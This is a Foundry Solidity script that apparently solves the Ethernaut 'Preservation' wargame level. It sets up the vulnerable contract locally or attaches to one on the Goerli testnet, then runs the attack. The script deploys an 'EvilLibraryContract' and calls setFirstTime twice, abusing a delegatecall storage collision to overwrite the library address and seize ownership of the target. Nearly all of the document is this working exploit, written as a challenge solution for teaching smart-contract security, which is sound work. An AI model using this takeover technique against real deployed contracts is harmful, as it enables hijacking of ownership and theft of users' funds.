// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/Preservation/Preservation.sol";
import "./EvilLibraryContract.sol";

contract PreservationScript is Script {

    address internal attacker;
    address internal deployer;
    Preservation target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = Preservation(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            LibraryContract lib1 = new LibraryContract();
            LibraryContract lib2 = new LibraryContract();
            target = new Preservation(address(lib1), address(lib2));
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        
        console.log("[Exploit]");
        vm.startBroadcast(attacker);
        EvilLibraryContract elib = new EvilLibraryContract();
        target.setFirstTime(uint160(address(elib)));
        target.setFirstTime(1337);
        vm.stopBroadcast();
        console.log("owner : %s", target.owner());
    }
}